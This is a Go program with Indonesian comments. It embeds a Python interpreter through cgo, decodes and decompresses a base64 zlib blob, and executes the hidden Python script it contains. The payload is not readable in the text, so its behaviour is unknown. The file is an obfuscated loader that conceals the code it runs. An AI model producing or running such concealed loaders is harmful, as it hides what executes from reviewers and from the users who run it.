package main

/*
// Menggunakan 'python3' sebagai target pkg-config untuk kompatibilitas luas.
#cgo pkg-config: python3

// LDFLAGS secara eksplisit menautkan pustaka Python versi spesifik untuk build yang andal.
#cgo LDFLAGS: -lpython3.13

#include <Python.h>
*/
import "C"
import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"io"
	"log"
	"unsafe"
)

const codeB64 = `eJytV81qHEcQvgv0Dp05SbAafMlFoIMcGRIFGSH5EpIw1O707rRnpnfonnYiGUMeQKeAgw8BXSLIMeSWXPwueQI9Qr7qnt/dlSwJz0Hstmq+qq7vq59VZbU0tahVKbe3trdmBVkrXtTSaCrOlE7d/vaWwJPKuUgSpVWdJDtWFvOJsFKn0kyEkTOp3kiz25jyE0VR/+UbrayiQlmySiynr2U+8gBsvSAtNJUkKnxWRpUixQm+SHzmU4uvhq1jDrNFPiVDpQSW7c/2uqc/C6GKfWFr05/y83LkdOyntWkveN/7m+LcmAzOXdzEc9AEtvLfzt9B53rFopTW0kJaWHz/Y5sQpojSNPHuG44awzupOZHI+pSy3Ge7C15ckF4IhaxokYK3siLlTSjtb/skJpqANqXy9JP+781pm5OYKkSY7syjoC6na5eLt6PMvtsXbxv7d9FuD1TBe403h6FsfB9R1W3i4jgWt9e/Xv33+5+M1ZORs6YGdNzHwkzWlOMipaN1ImpZUDZ0iTTqxcJpwucepid/NxbHSJiYysKVIpC2gjlAg0wANMBpPCDtquiVAeOfSGRUKzCjWAYua2vXkCUxQ/LGqjiTtTN6XRL9wcullndkJZAR/aBvr6/+EV85Qxk8NS2DjBJfcyj+MkdUULkv2HBIp5qPpbE/Ftx8aTo9Qmj3mQ7FAa5/2ywfWVi58mJzidvrm1/E846NEbem0/dE1FQpBDJF8o2+eEC243isOflzZRDZA1W3kJBA4Uu7lrkNEXltsTYMn8+avA9ChkHKCX8k1WsF/+pJLjfexXjvYmeF4ChAcAJrFFiFgjC1x06Vz23ueI5VOFViygllX+yoIQc1WfGkykSmilA2YoFqrJgcPlA1F/+VL/7e+YiSTNIbqZPK0IU0n4OSdNkqKJfCOrN4bNE9mImNnh5FwHckDgt0rwm6igN6ucyWYY7snThBCzLIf61AzYBtWLLEOYLN3TdadcP6kDnV/EpOpQqT6jWY1PDDc1D7evHFBa8YX5qCsxd6kRMcqjRbKu7lK+ARbyJozMsFBehUsV7QqfOgo2PSEAhfJ4cy8lgcwgr95Pb6j7/RK97fpQvSiKKWjxoQ/h2rnlitLVz/6bDB4wpZa/sPctJjjbxN2l4l51j3SqdnruCa8ZhWzrAucGUVDLTn/26M7/MMEBRnd9N+aJxIfwHcqHT7opnenaQwG2YZ1Akio/Og0Az0+j11ThYSZYXxzlpCX1OVEs+k3LGCDvFfvItXWFloOK6Vf++R28bNv14fG0cGO58IZPMgiiZiXjibHbwyTu6OjXlxj20hZbXzLH725dou047PU46W8kzxWJmIvi8S05X5Sl9teWiWmdS1ikW32rBuS1J6p5WqB0rM8vLyAsvocK3fic6WlxnQzomBc5dlGW4SPW9SFdydI6eFE0eqzUxLQsdkp/0naD7sCSGOgBb6SUsXKtb66AIjxw41PqwAzkqeOevsECmABDzL7jo4bhVtifp+E8KZqhwywpLFWwaWKfwY+qLtBCOFj9TdK7vLxSDbcb/tRYcjbfGPigtXln0ucCNucroZeSy9Dx/aRN+BeSJtzn3GVNi/M7RSQ/mk30ds4M033abUSxc24Zu/PgF9tEFrwAMVnRxrGWYxGq5H/ZYMLjGU7ZRSxd7eX/kaajyu+x0u4V37HdbGR4CDKO4LfoP82GIFoyHWeLna3Qh3Jfh6QWbhB7TfD+4GHa8HPegoeaNR4U0U/x6HUmWSiIMDESUJ12WStN0kVOn/WtfWzA==`

func decodeAndDecompress(encoded string) []byte {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		log.Fatalf("FATAL: Proses dekode base64 gagal: %v", err)
	}

	b := bytes.NewReader(decoded)
	r, err := zlib.NewReader(b)
	if err != nil {
		log.Fatalf("FATAL: Inisialisasi zlib reader gagal: %v", err)
	}
	defer r.Close()

	decompressed, err := io.ReadAll(r)
	if err != nil {
		log.Fatalf("FATAL: Proses dekompresi zlib gagal: %v", err)
	}
	return decompressed
}

func main() {
	pySrc := decodeAndDecompress(codeB64)

	C.Py_Initialize()
	if C.Py_IsInitialized() == 0 {
		log.Fatal("FATAL: Inisialisasi interpreter Python gagal.")
	}

	cStr := C.CString(string(pySrc))
	defer C.free(unsafe.Pointer(cStr))

	if C.PyRun_SimpleString(cStr) != 0 {
		log.Fatal("FATAL: Eksekusi skrip Python gagal.")
	}

	C.Py_Finalize()
}